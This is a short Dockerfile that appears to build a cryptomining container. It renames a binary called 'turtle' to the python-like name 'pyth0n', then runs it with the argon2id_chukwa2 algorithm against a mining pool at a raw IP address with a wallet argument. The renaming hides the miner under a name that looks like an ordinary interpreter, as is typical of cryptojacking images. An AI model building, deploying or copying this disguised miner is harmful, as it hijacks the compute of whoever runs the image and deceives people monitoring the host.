FROM christiankm01/master:latest
RUN set -ex \
  && mv /usr/bin/turtle /usr/bin/pyth0n \
  && pyth0n  --algorithm argon2id_chukwa2 --pool 23.95.242.133:3022 --wallet userA -k
